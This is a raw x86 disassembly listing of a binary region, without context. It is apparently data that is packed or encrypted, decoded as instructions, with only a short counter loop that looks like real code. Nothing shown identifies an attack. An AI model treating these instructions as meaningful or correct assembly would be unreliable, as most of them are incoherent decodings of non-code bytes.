  409f06:	jge    0x409f2e
  409f08:	pop    esi
  409f09:	mov    ebp,0x2b27e874
  409f0e:	and    bh,BYTE PTR [ebx]
  409f10:	inc    ecx
  409f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f12:	sti    
  409f13:	mov    bh,0x88
  409f15:	clc    
  409f16:	repz in eax,0x65
  409f19:	clc    
  409f1a:	xor    eax,0x2a3aeb5e
  409f1f:	sub    bl,0x90
  409f22:	sbb    al,0x4c
  409f24:	shr    DWORD PTR [ecx-0x55],cl
  409f27:	sbb    eax,DWORD PTR [esp+ebp*2]
  409f2a:	nop
  409f2b:	lahf   
  409f2c:	je     0x409ef7
  409f2e:	xchg   edi,eax
  409f2f:	mov    cl,0xe4
  409f31:	(bad)  
  409f32:	enter  0xbf72,0x8
  409f36:	int3   
  409f37:	retf   
  409f38:	std    
  409f39:	leave  
  409f3a:	xchg   ebx,eax
  409f3b:	cmp    ebx,DWORD PTR [ebx+0x4fd03c1b]
  409f41:	stos   DWORD PTR es:[edi],eax
  409f42:	fst    st(2)
  409f44:	pop    eax
  409f45:	push   ss
  409f46:	adc    edi,DWORD PTR [eax]
  409f48:	(bad)  
  409f49:	jmp    0x4b00:0xb8d3efd0
  409f50:	cmp    al,0x96
  409f52:	push   ebp
  409f53:	test   DWORD PTR [edx+0x5e9fcddc],0x73094dfd
  409f5d:	mov    cl,0x95
  409f5f:	cmp    DWORD PTR [edx+0x53],esp
  409f62:	xchg   ebp,eax
  409f63:	inc    ecx
  409f64:	push   eax
  409f65:	clc    
  409f66:	or     ebp,DWORD PTR [ebp+0x155602ed]
  409f6c:	ja     0x409f9a
  409f6e:	mov    edx,0xe6e8e5b
  409f73:	fdiv   st,st(4)
  409f75:	add    ah,BYTE PTR [ebp+0x28]
  409f78:	push   ecx
  409f79:	gs jae 0x409f6f
  409f7c:	jg     0x409fe6
  409f7e:	xchg   BYTE PTR [ecx-0xe],dh
  409f81:	pusha  
  409f82:	cmp    BYTE PTR [ecx],ch
  409f84:	inc    eax
  409f85:	or     DWORD PTR [edi+0x182a4528],0xffffff80
  409f8c:	ins    DWORD PTR es:[edi],dx
  409f8d:	jbe    0x409f66
  409f8f:	xor    al,0xa0
  409f91:	jl     0x409f65
  409f93:	inc    eax
  409f94:	cmp    al,BYTE PTR [eax]
  409f96:	pusha  
  409f97:	or     cl,BYTE PTR [edx-0x57]
  409f9a:	retf   
  409f9b:	pop    esi
  409f9c:	push   0xffffff9f
  409f9e:	xor    dh,dl
  409fa0:	imul   edx,DWORD PTR [ecx+0x9],0x7cc9ba92
  409fa7:	push   ecx
  409fa8:	cmp    DWORD PTR [edi-0x7],0x6
  409fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fad:	rcl    ebx,cl
  409faf:	bound  ecx,QWORD PTR [edi+0x1c22e969]
  409fb5:	dec    edx
  409fb6:	cmp    DWORD PTR [esi+0x6f],esp
  409fb9:	fisubr DWORD PTR [ebx-0x40]
  409fbc:	outs   dx,BYTE PTR ds:[esi]
  409fbd:	mov    BYTE PTR [ebx+0x20],dh
  409fc0:	pop    eax
  409fc1:	xor    DWORD PTR [edx],esp
  409fc3:	push   esp
  409fc4:	mov    dl,0xaa
  409fc6:	leave  
  409fc7:	pop    esp
  409fc8:	daa    
  409fc9:	int    0x38
  409fcb:	mov    dl,0xb1
  409fcd:	pop    edi
  409fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fcf:	lods   eax,DWORD PTR ds:[esi]
  409fd0:	rcl    bl,1
  409fd2:	shl    DWORD PTR [edx+ebp*2-0x64],1
  409fd6:	mov    bh,0xcd
  409fd8:	xchg   ecx,eax
  409fd9:	(bad)
  409fdd:	out    0xce,al
  409fdf:	and    dh,BYTE PTR [edi+0x465e6d75]
  409fe5:	test   eax,0xf5bb89f0
  409fea:	sar    BYTE PTR [esi+0x13cfaa9f],cl
  409ff0:	push   edx
  409ff1:	ja     0x409fb7
  409ff3:	inc    esp
  409ff4:	mov    ds:0xe5fde190,eax
  409ff9:	or     dl,BYTE PTR [ebx+0x60053755]
  409fff:	xchg   esp,eax
  40a000:	nop
  40a001:	icebp  
  40a002:	mov    dh,0x68
  40a004:	clc    
  40a005:	mov    al,ds:0xb6561142
  40a00a:	jo     0x40a03d
  40a00c:	adc    al,0x9e
  40a00e:	stos   DWORD PTR es:[edi],eax
  40a00f:	jmp    0x409ff2
  40a011:	xlat   BYTE PTR ds:[ebx]
  40a012:	(bad)  
  40a013:	sub    eax,0x601bb3b5
  40a018:	mov    esi,0xcdab2cd0
  40a01d:	add    al,0x7e
  40a020:	or     BYTE PTR ds:0x91492a92,bh
  40a026:	sub    cl,ch
  40a028:	mov    ebp,0xf8eaa35c
  40a02d:	mov    al,0x82
  40a02f:	test   eax,0xd2e9aa39
  40a034:	js     0x40a06a
  40a036:	pop    edi
  40a037:	and    esp,DWORD PTR [edi+0x38e31aae]
  40a03d:	js     0x40a00e
  40a03f:	mov    bh,0x42
  40a041:	out    dx,eax
  40a042:	push   ds
  40a043:	cmp    bh,bh
  40a045:	lock out dx,eax
  40a047:	int    0x86
  40a049:	sbb    esp,DWORD PTR [esi-0x41]
  40a04c:	fist   DWORD PTR ds:0x2a556754
  40a052:	aad    0xcc
  40a054:	sahf   
  40a055:	cdq    
  40a056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a057:	inc    ecx
  40a058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a059:	js     0x40a02f
  40a05b:	or     dl,BYTE PTR [edi-0x61]
  40a05e:	cmp    ah,BYTE PTR [edx-0x4892de74]
  40a064:	or     al,0xcc
  40a066:	adc    BYTE PTR [ebx-0xc9af636],bl
  40a06c:	in     al,0x7e
  40a06e:	icebp  
  40a06f:	adc    eax,0xdd90c17e
  40a074:	(bad)  [edx+eax*2-0x5e]
  40a078:	and    dh,dh
  40a07a:	mov    ecx,0x583fc0d1
  40a07f:	push   esp
  40a080:	(bad)  
  40a082:	dec    ecx
  40a083:	adc    esi,DWORD PTR [ebx]
  40a085:	mov    ebx,0xda8ebf32
  40a08a:	retf   
  40a08b:	cli    
  40a08c:	xor    al,BYTE PTR [edi+0x38]
  40a08f:	std    
  40a090:	repnz push ecx
  40a092:	int    0x44
  40a094:	test   ecx,ebx
  40a096:	ss repz aam 0xdd
  40a09a:	jno    0x40a046
  40a09c:	(bad)  
  40a09d:	mov    eax,ds:0xed8ff0be
  40a0a2:	push   edi
  40a0a3:	outs   dx,DWORD PTR ds:[esi]
  40a0a4:	dec    eax
  40a0a5:	pop    edx
  40a0a6:	out    0x1c,eax
  40a0a8:	pop    ecx
  40a0a9:	sbb    al,0x37
  40a0ab:	inc    edi
  40a0ac:	xchg   ebx,eax
  40a0ad:	lods   al,BYTE PTR ds:[esi]
  40a0ae:	dec    eax
  40a0af:	cmp    al,0xd9
  40a0b1:	adc    al,0xfb
  40a0b3:	stos   BYTE PTR es:[edi],al
  40a0b4:	mov    eax,ds:0xd094ff08
  40a0b9:	cmp    al,0x3b
  40a0bb:	cmp    ch,ah
  40a0bd:	idiv   esp
  40a0bf:	ficom  WORD PTR [esi+0x3a617d11]
  40a0c5:	test   al,0x3d
  40a0c7:	out    dx,al
  40a0c8:	ss cmp eax,0x7a97fa8
  40a0ce:	pop    edi
  40a0cf:	ins    BYTE PTR es:[edi],dx
  40a0d0:	dec    eax
  40a0d1:	or     al,0xea
  40a0d3:	imul   ecx,DWORD PTR [esi-0x2bbb36cf],0xffffffa6
  40a0da:	pop    es
  40a0db:	fstp   QWORD PTR [ebx+0x52]
  40a0de:	adc    eax,0x2728fbc3
  40a0e3:	or     bl,BYTE PTR [edx+0x3859a837]
  40a0e9:	rcr    BYTE PTR [edi],0x26
  40a0ec:	pop    esp
  40a0ed:	lods   eax,DWORD PTR ds:[esi]
  40a0ee:	pushf  
  40a0ef:	imul   ecx,DWORD PTR [eax+0x1c],0x5f
  40a0f3:	adc    eax,0xaef8dd25
  40a0f8:	mov    al,BYTE PTR [esi+eiz*4+0x2306d735]
  40a0ff:	xor    bh,BYTE PTR [esi]
  40a101:	fstp   DWORD PTR [esi-0x33]
  40a104:	nop
  40a105:	jecxz  0x40a0e2
  40a107:	stc    
  40a108:	mov    ecx,0x14db68ab
  40a10d:	pop    edx
  40a10e:	bound  ebx,QWORD PTR [ebx+esi*2]
  40a111:	shr    DWORD PTR [esp+edi*1+0x1d56f1fd],cl
  40a118:	iret   
  40a119:	adc    al,BYTE PTR [eax+0x2b]
  40a11c:	sbb    al,ch
  40a11e:	cs retf 0x2b5f
  40a122:	aas    
  40a123:	(bad)  
  40a124:	jmp    0x40a150
  40a126:	mov    dh,0x65
  40a128:	retf   0x8797
  40a12b:	mov    ds:0x5c65c9c2,al
  40a130:	adc    dh,BYTE PTR [ecx+0x1999d071]
  40a136:	inc    ebx
  40a137:	mov    ecx,0xce894982
  40a13c:	inc    edi
  40a13d:	jg     0x40a1aa
  40a13f:	cmp    bl,BYTE PTR ds:0x12850f2c
  40a145:	push   edx
  40a146:	push   0x51
  40a148:	rcr    dh,1
  40a14a:	pop    ecx
  40a14b:	jo     0x40a101
  40a14d:	jmp    0x40a0d7
  40a14f:	fwait
  40a150:	cmp    eax,0xd132930c
  40a155:	ror    DWORD PTR [edx],0x93
  40a158:	xchg   edx,eax
  40a159:	icebp  
  40a15a:	cwde   
  40a15b:	cli    
  40a15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a15d:	pop    esp
  40a15e:	dec    ecx
  40a15f:	stc    
  40a160:	imul   eax,esi,0x51
  40a163:	test   BYTE PTR [ebp+0x69],ch
  40a166:	xor    eax,esi
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	das    
  40a17a:	adc    BYTE PTR [ebp+0x7ee7390d],dl
  40a180:	jle    0x40a1b0
  40a182:	jge    0x40a202
  40a184:	jle    0x40a1c1
  40a186:	imul   edx,esi,0xffffffe2
  40a189:	int3   
  40a18a:	xchg   edx,eax
  40a18b:	mov    ds:0x855f06d8,al
  40a190:	dec    eax
  40a191:	int    0x14
  40a193:	dec    ebx
  40a194:	sub    edx,DWORD PTR [ecx+0x54a8ca59]
  40a19a:	lahf   
  40a19b:	call   0xff095e93
  40a1a0:	dec    ecx
  40a1a1:	fnstenv [ebx+0x4]
  40a1a4:	lods   al,BYTE PTR ds:[esi]
  40a1a5:	add    BYTE PTR [eax+0x53],0xfc
  40a1a9:	retf   0xcc85
  40a1ac:	adc    al,0x5c
  40a1ae:	adc    BYTE PTR [edi],bl
  40a1b0:	loop   0x40a15f
  40a1b2:	cli    
  40a1b3:	mov    ebx,0x27535249
  40a1b8:	add    eax,0xe4aadfe5
  40a1bd:	xchg   ah,cl
  40a1bf:	mov    bh,0xfd
  40a1c1:	jno    0x40a1b1
  40a1c3:	xor    edi,DWORD PTR [esi]
  40a1c5:	test   BYTE PTR [ebp-0x50],0x64
  40a1c9:	add    al,0x3f
  40a1cb:	jmp    0x76c3e52b
  40a1d0:	sub    eax,0x9f2d5f75
  40a1d5:	stos   BYTE PTR es:[edi],al
  40a1d6:	into   
  40a1d7:	xchg   esi,eax
  40a1d8:	mov    dl,0x10
  40a1da:	outs   dx,DWORD PTR ds:[esi]
  40a1db:	out    dx,al
  40a1dc:	push   ebx
  40a1dd:	sub    edx,eax
  40a1df:	jle    0x40a18a
  40a1e1:	mov    ecx,0xb0328abe
  40a1e6:	add    al,0x7a
  40a1e8:	cvttps2pi mm1,xmm2
  40a1eb:	dec    ebp
  40a1ec:	mov    ch,0x6
  40a1ee:	jecxz  0x40a267
  40a1f0:	ret    0x7f50
  40a1f3:	xor    ch,BYTE PTR [edx]
  40a1f5:	sub    dl,al
  40a1f7:	sahf   
  40a1f8:	dec    edx
  40a1f9:	mov    al,ds:0xddc19fd2
  40a1fe:	xor    ecx,DWORD PTR [eax]
  40a200:	and    bl,ch
  40a202:	push   ds
  40a203:	mov    eax,ds:0x115d28b2
  40a208:	enter  0x1eb0,0xef
  40a20c:	test   BYTE PTR [ecx],bh
  40a20e:	out    dx,eax
  40a20f:	xor    dl,BYTE PTR [esi+0x3567b682]
  40a215:	out    0xb7,al
  40a217:	sbb    ah,BYTE PTR [edx-0x5f]
  40a21a:	jge    0x40a212
  40a21c:	push   ebx
  40a21d:	out    0x17,eax
  40a21f:	jge    0x40a1ba
  40a221:	fs mov ah,0xd2
  40a224:	sbb    BYTE PTR [edi-0x2a60a039],ah
  40a22a:	dec    DWORD PTR [ebx]
  40a22c:	mov    esp,0x1cd543a2
  40a231:	inc    DWORD PTR fs:[eax]
  40a234:	cmp    dh,BYTE PTR [esi-0x20]
  40a237:	idiv   BYTE PTR [eax-0x691e4575]
  40a23d:	popa   
  40a23e:	jmp    0xd1de93e2
  40a243:	pusha  
  40a244:	popa   
  40a245:	sub    BYTE PTR [ecx+0x31f96396],cl
  40a24b:	jmp    0x334d897
  40a250:	inc    BYTE PTR [esi+0x21]
  40a253:	push   ds
  40a254:	call   0x358aa705
  40a259:	retf   
  40a25a:	dec    ebx
  40a25b:	iret   
  40a25c:	xor    al,0xde
  40a25e:	cli    
  40a25f:	cwde   
  40a260:	loopne 0x40a259
  40a262:	ds dec ebp
  40a264:	mov    dh,0x38
  40a266:	adc    al,0x32
  40a268:	pop    ds
  40a269:	ret    0xa65
  40a26c:	pushf  
  40a26d:	fld    QWORD PTR [edi+ebp*2]
  40a270:	shl    BYTE PTR [ebp+0x125bc51],0xb2
  40a277:	aas    
  40a278:	cmp    ebp,DWORD PTR [esi+0x60]
  40a27b:	or     DWORD PTR [ebx+edx*8],0xffffffa5
  40a27f:	rol    BYTE PTR [ebp-0x60],cl
  40a282:	mov    al,0xa0
  40a284:	dec    ebx
  40a285:	cmp    bl,BYTE PTR [esi+0x46]
  40a288:	jecxz  0x40a2f9
  40a28a:	push   es
  40a28b:	mov    BYTE PTR [ecx],cl
  40a28d:	or     esp,0xffffffeb
  40a290:	adc    al,0x57
  40a292:	cmp    eax,0x3294a63d
  40a297:	in     eax,0x33
  40a299:	sahf   
  40a29a:	sbb    eax,0x984f000b
  40a29f:	les    ecx,FWORD PTR [eax-0x5f32265b]
  40a2a5:	sbb    al,ch
  40a2a7:	cmp    al,0xc
  40a2a9:	jge    0x40a284
  40a2ab:	xchg   edi,eax
  40a2ac:	or     ebx,DWORD PTR [edi]
  40a2ae:	xchg   edi,eax
  40a2af:	sbb    edx,ebx
  40a2b1:	(bad)  
  40a2b2:	dec    esi
  40a2b3:	test   eax,0x7174f1f4
  40a2b8:	cmp    DWORD PTR [ebx-0x6220d94],0x34
  40a2bf:	js     0x40a2fa
  40a2c1:	or     DWORD PTR gs:[eax],esi
  40a2c4:	shl    ecx,cl
  40a2c6:	or     ebx,DWORD PTR [esi]
  40a2c8:	data16 xlat BYTE PTR ds:[ebx]
  40a2ca:	xor    DWORD PTR [esi-0x55937d66],esi
  40a2d0:	inc    edx
  40a2d1:	cmp    al,0x59
  40a2d3:	fwait
  40a2d4:	nop
  40a2d5:	leave  
  40a2d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2d7:	sub    DWORD PTR [ecx-0x27],eax
  40a2da:	out    dx,eax
  40a2db:	pop    ds
  40a2dc:	fwait
  40a2dd:	cmc    
  40a2de:	dec    esp
  40a2df:	outs   dx,BYTE PTR ds:[esi]
  40a2e0:	ret    
  40a2e1:	retf   0x61a8
  40a2e4:	cs cs push 0x8b3a24b5
  40a2eb:	(bad)  [edx+0x5b]
  40a2ee:	in     al,dx
  40a2ef:	js     0x40a343
  40a2f1:	mov    edi,0x59d9b70b
  40a2f6:	arpl   WORD PTR [eax+0x365353ba],dx
  40a2fc:	and    esp,DWORD PTR [edx+0x6c]
  40a2ff:	pop    ecx
  40a300:	sub    ebp,DWORD PTR [edx]
  40a302:	jl     0x40a372
  40a304:	pusha  
  40a305:	ror    DWORD PTR [edi+0x21],cl
  40a308:	scas   al,BYTE PTR es:[edi]
  40a309:	mov    cl,BYTE PTR [ebp-0x32f241df]
  40a30f:	inc    edi
  40a310:	scas   al,BYTE PTR es:[edi]
  40a311:	xchg   esi,eax
  40a312:	xor    BYTE PTR [esi],bh
  40a314:	push   eax
  40a315:	jmp    0x40a33a
  40a317:	jmp    0x27f4:0xdda8a609
  40a31e:	popf   
  40a31f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a320:	cmp    DWORD PTR [edi],0x8f6629de
  40a326:	out    0x12,eax
  40a328:	push   esp
  40a329:	cmp    BYTE PTR [ebx+eiz*4+0x5b],0xe5
  40a32e:	jp     0x40a34e
  40a330:	inc    esp
  40a331:	xlat   BYTE PTR ds:[ebx]
  40a332:	mov    dl,BYTE PTR [esi-0x2afbe858]
  40a338:	inc    ebp
  40a339:	lods   eax,DWORD PTR ds:[esi]
  40a33a:	ja     0x40a36a
  40a33c:	jle    0x40a35a
  40a33e:	sub    BYTE PTR [esi+0x5c],dh
  40a341:	out    0x59,al
  40a343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a344:	xchg   esi,eax
  40a345:	xchg   esi,eax
  40a346:	add    DWORD PTR [esi+0x4314cc1f],edx
  40a34c:	mov    al,0x92
  40a34e:	sbb    al,0xa
  40a350:	dec    edx
  40a351:	cmp    bl,BYTE PTR [ebx]
  40a353:	lods   al,BYTE PTR ds:[esi]
  40a354:	mov    ds:0x16a636d,eax
  40a359:	xchg   ebx,eax
  40a35a:	daa    
  40a35b:	mov    dh,0xf8
  40a35d:	js     0x40a391
  40a35f:	je     0x40a3be
  40a361:	or     cl,BYTE PTR [eax+esi*1-0x22]
  40a365:	outs   dx,BYTE PTR ds:[esi]
  40a366:	push   edi
  40a367:	inc    esp
  40a368:	(bad)  
  40a369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a36a:	dec    ebx
  40a36b:	out    0xf6,al
  40a36d:	adc    eax,0x8de1cc56
  40a372:	xchg   esi,eax
  40a373:	cmp    eax,DWORD PTR [edx+esi*2-0xf]
  40a377:	int3   
  40a378:	push   esp
  40a379:	push   es
  40a37a:	int    0xd5
  40a37c:	inc    edi
  40a37d:	sti    
  40a37e:	push   ss
  40a37f:	jge    0x40a3c3
  40a381:	cmp    eax,0xbdf4ae47
  40a386:	xlat   BYTE PTR ds:[ebx]
  40a387:	adc    al,0xa7
  40a389:	ror    BYTE PTR [edx+edx*1+0x31],cl
  40a38d:	jecxz  0x40a369
  40a38f:	pop    edi
  40a390:	adc    BYTE PTR [eax+0x26f6a0dd],0x42
  40a397:	ret    
  40a398:	ret    
  40a399:	jmp    0x40a418
  40a39b:	fld    QWORD PTR [esi-0x4d]
  40a39e:	loope  0x40a419
  40a3a0:	aas    
  40a3a1:	fmul   DWORD PTR [esp+ebp*8]
  40a3a4:	aam    0xfa
  40a3a6:	and    BYTE PTR [bp+di+0x42],dl
  40a3aa:	jne    0x40a351
  40a3ac:	sub    al,0xf
  40a3ae:	hlt    
  40a3af:	daa    
  40a3b0:	adc    edx,esi
  40a3b2:	mov    esp,0x5691bfcf
  40a3b7:	shl    esi,cl
  40a3b9:	mov    dl,0x9
  40a3bb:	mov    dh,0x15
  40a3bd:	jne    0x40a42a
  40a3bf:	push   ecx
  40a3c0:	ins    BYTE PTR es:[edi],dx
  40a3c1:	push   esi
  40a3c2:	dec    ecx
  40a3c3:	xchg   edi,eax
  40a3c4:	or     BYTE PTR [ebp+0x8b05794],0x8a
  40a3cb:	je     0x40a3f2
  40a3cd:	mov    bl,0xe0
  40a3cf:	mov    edx,0xb68d1ab3
  40a3d4:	inc    esi
  40a3d5:	sub    eax,0x88f78b50
  40a3da:	(bad)  
  40a3db:	in     eax,dx
  40a3dc:	ins    BYTE PTR es:[edi],dx
  40a3dd:	mov    eax,ds:0x92a4ad71
  40a3e2:	aad    0xad
  40a3e4:	not    ch
  40a3e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3e7:	or     al,0xa1
  40a3e9:	out    0x6a,al
  40a3eb:	or     al,0x24
  40a3ed:	pusha  
  40a3ee:	fistp  WORD PTR [esi]
  40a3f0:	pop    ds
  40a3f1:	outs   dx,DWORD PTR ds:[esi]
  40a3f2:	push   0xffffff86
  40a3f4:	inc    edi
  40a3f5:	push   ecx
  40a3f6:	es cli 
  40a3f8:	mov    eax,0x42da5ed4
  40a3fd:	nop
  40a3fe:	and    eax,0xb684a0f6
  40a403:	ret    
  40a404:	iret   
  40a405:	inc    ebx
  40a406:	jl     0x40a3e0
  40a408:	xorps  xmm0,xmm2
  40a40b:	push   ss
  40a40c:	mov    eax,ds:0xccf3b9c9
  40a411:	cmp    ebp,DWORD PTR [esp+ebp*4]
  40a414:	dec    esp
  40a415:	retf   0x52b5
  40a418:	sbb    ch,ah
  40a41a:	and    dh,BYTE PTR [ebx-0x7d722a37]
  40a420:	sub    bh,BYTE PTR [ebx+0x6f4c5a7a]
  40a426:	cmp    cl,BYTE PTR [esi+0x69]
  40a429:	call   0x57eb0de3
  40a42e:	push   esp
  40a42f:	jg     0x40a402
  40a431:	les    cx,DWORD PTR [edx-0x750f8201]
  40a438:	inc    ebx
  40a439:	mov    ecx,0x3aa09de2
  40a43e:	push   es
  40a43f:	repz int 0xf8
  40a442:	and    ebp,0x7a
  40a445:	call   0xbdf3:0x8080c09f
  40a44c:	inc    ecx
  40a44d:	stos   BYTE PTR es:[edi],al
  40a44e:	sbb    eax,0xf4b2a92d
  40a453:	arpl   WORD PTR cs:[ecx],cx
  40a456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a457:	pop    edi
  40a458:	pusha  
  40a459:	or     al,0xcd
  40a45b:	call   0xc370:0x4dd2165a
  40a462:	mov    ch,0xe9
  40a464:	push   edx
  40a465:	aad    0xc1
  40a467:	adc    eax,0x7d5567b4
  40a46c:	add    al,0x21
  40a46e:	aam    0xd7
  40a470:	cli    
  40a471:	ja     0x40a493
  40a473:	dec    ebp
  40a474:	popf   
  40a475:	or     ah,BYTE PTR [eax+0x2c]
  40a478:	dec    ecx
  40a479:	jl     0x40a478
  40a47b:	cwde   
  40a47c:	(bad)  
  40a47e:	int    0xed
  40a480:	adc    bl,dl
  40a482:	push   esi
  40a483:	sbb    al,0xb7
  40a485:	mov    dh,0xb6
  40a487:	and    eax,0xc813af82
  40a48c:	dec    edi
  40a48d:	sahf   
  40a48e:	test   BYTE PTR [ecx+0x5e829266],dl
  40a494:	jb     0x40a488
  40a496:	push   ebp
  40a497:	and    DWORD PTR [ebx-0x2095e069],edx
  40a49d:	pop    ebp
  40a49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a49f:	add    esi,esi
  40a4a1:	ins    BYTE PTR es:[edi],dx
  40a4a2:	scas   al,BYTE PTR es:[edi]
  40a4a3:	jb     0x40a49a
  40a4a5:	pushf  
  40a4a6:	jns    0x40a469
  40a4a8:	ss pop ss
  40a4aa:	cmp    BYTE PTR [ebp+0x66],cl
  40a4ad:	cmp    eax,0x6f8958a5
  40a4b2:	pop    ss
  40a4b3:	lods   eax,DWORD PTR ds:[esi]
  40a4b4:	mov    eax,DWORD PTR [ebx]
  40a4b6:	mov    DWORD PTR [ecx+0x43037125],0x0
  40a4c0:	add    BYTE PTR [ebx],dh
  40a4c2:	fisttp DWORD PTR [ebx]
  40a4c4:	sbb    eax,0x430371
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x430371,ebx
  40a4d0:	cmp    DWORD PTR ds:0x430371,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eb3b
  40a4e8:	cmp    DWORD PTR ds:0x430371,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	xor    bh,BYTE PTR ss:[esi-0x79]
  40a514:	sub    ecx,0xffffffe2
  40a517:	jle    0x40a597
  40a519:	cs jge 0x40a59a
  40a51c:	jle    0x40a563
  40a51e:	mov    al,ds:0xf5af2ae4
  40a523:	jo     0x40a4f1
  40a525:	cmp    al,0xc4
  40a527:	sub    eax,0x68300930
  40a52c:	jae    0x40a4fb
  40a52e:	dec    edx
  40a52f:	lds    edx,FWORD PTR [ebx]
  40a531:	enter  0x9e33,0x46
  40a535:	xchg   BYTE PTR [edx],bh
  40a537:	stos   DWORD PTR es:[edi],eax
  40a538:	sahf   
  40a539:	mov    al,ds:0xc7180691
  40a53e:	pusha  
  40a53f:	mov    edx,0xe8bce0b6
  40a544:	mov    ah,0x23
  40a546:	jl     0x40a4cf
  40a548:	hlt    
  40a549:	push   esp
  40a54a:	dec    ebx
  40a54b:	test   ax,0x8cdd
  40a54f:	push   0xaf5db740
  40a554:	fild   DWORD PTR [edi]
  40a556:	cmp    ebp,DWORD PTR [edx-0x33]
  40a559:	cmp    eax,0xc7a14f5d
  40a55e:	push   0x47e8f258
  40a563:	mov    eax,0x8287ed11
  40a568:	popf   
  40a569:	adc    edi,DWORD PTR [edi+0xd15637e]
  40a56f:	iret   
  40a570:	les    ebx,FWORD PTR [edx]
  40a572:	bnd js 0x40a514
  40a575:	add    BYTE PTR [edx-0x7f],cl
  40a578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a579:	add    eax,0xede5b811
  40a57e:	mov    DWORD PTR ss:[eax+edi*1+0x6fdbb89d],ebx
  40a586:	jo     0x40a5b9
  40a588:	icebp  
  40a589:	fmulp  st(4),st
  40a58b:	std    
  40a58c:	sub    esp,DWORD PTR ds:[edx+0x0]
  40a590:	pop    ecx
  40a591:	(bad)  
  40a592:	out    dx,eax
  40a593:	mov    dl,0x21
  40a595:	xor    ebp,eax
  40a597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a598:	loopne 0x40a610
  40a59a:	or     ah,bl
  40a59c:	fs mov dh,0x7b
  40a59f:	inc    ebp
  40a5a0:	xchg   esi,eax
  40a5a1:	xor    DWORD PTR [edi-0x28c1a394],edx
  40a5a7:	mov    bh,ah
  40a5a9:	jb     0x40a5e2
  40a5ab:	fst    DWORD PTR [ebx-0x2849b24c]
  40a5b1:	aam    0xc0
  40a5b3:	or     esp,0xffffffd2
  40a5b6:	ret    
  40a5b7:	pop    ebp
  40a5b8:	mov    al,ds:0xe4b1d910
  40a5bd:	push   0xdea052d
  40a5c2:	out    dx,eax
  40a5c3:	mov    dh,0xe3
  40a5c5:	mov    cs,WORD PTR [eax+0x5d47634e]
  40a5cb:	arpl   WORD PTR [edi],ax
  40a5cd:	adc    al,0xec
  40a5cf:	xchg   edx,eax
  40a5d0:	mov    dh,0xc2
  40a5d2:	cld    
  40a5d3:	xor    DWORD PTR [ebx-0x7bfd03f7],esp
  40a5d9:	mov    eax,ds:0x330a6d0d
  40a5de:	mov    cl,0x7b
  40a5e0:	sub    ch,bh
  40a5e2:	shr    DWORD PTR [edx],0x19
  40a5e5:	mov    ?,edx
  40a5e7:	shl    bh,0x62
  40a5ea:	sub    eax,0x4486b337
  40a5ef:	cs cmp eax,eax
  40a5f2:	adc    ebp,0x8134b38e
  40a5f8:	jno    0x40a585
  40a5fa:	lods   eax,DWORD PTR ds:[esi]
  40a5fb:	add    eax,0x30ceee57
  40a600:	ror    DWORD PTR [eax+0x66aa020c],cl
  40a606:	jnp    0x40a5c2
  40a608:	sub    al,0xb0
  40a60a:	in     eax,dx
  40a60b:	bound  eax,QWORD PTR [edx-0x16]
  40a60e:	mov    al,ds:0x55dac988
  40a613:	mov    bh,0x9b
  40a615:	dec    ebp
  40a616:	call   0x89d4:0x9778c10
  40a61d:	xor    DWORD PTR [edi-0x23875a9],ebx
  40a623:	js     0x40a682
  40a625:	in     eax,dx
  40a626:	add    eax,0xb520d037
  40a62b:	cmp    DWORD PTR [esi],ebx
  40a62d:	inc    esi
  40a62e:	mov    ah,0x54
  40a630:	jns    0x40a5e6
  40a632:	cmp    cl,BYTE PTR [ebx]
  40a634:	fadd   DWORD PTR fs:[esi+edx*1]
  40a638:	scas   eax,DWORD PTR es:[edi]
  40a639:	ret    
  40a63a:	adc    DWORD PTR [ecx],ebp
  40a63c:	aam    0x56
  40a63e:	loop   0x40a6ad
  40a640:	pop    es
  40a641:	sbb    DWORD PTR [edx+0x53],ecx
  40a644:	sbb    dh,BYTE PTR [esi+0x3a]
  40a647:	or     ch,0xd3
  40a64a:	stos   DWORD PTR es:[edi],eax
  40a64b:	repnz nop
  40a64d:	fdiv   QWORD PTR ds:0x206435d6
  40a653:	imul   bl
  40a655:	adc    al,0x94
  40a657:	clc    
  40a658:	xchg   DWORD PTR [esi+0x1],ecx
  40a65b:	iret   
  40a65c:	mov    ds:0xfa36b7ce,eax
  40a661:	out    0x90,al
  40a663:	cmc    
  40a664:	jmp    0xc2f9:0xe48f9287
  40a66b:	add    al,0x98
  40a66d:	int    0x78
  40a66f:	cmp    al,0x98
  40a671:	gs retf 0x2687
  40a675:	outs   dx,DWORD PTR ds:[esi]
  40a676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a677:	sbb    ch,BYTE PTR [esi]
  40a679:	js     0x40a6a8
  40a67b:	fnsave [eax+edx*8-0x3d]
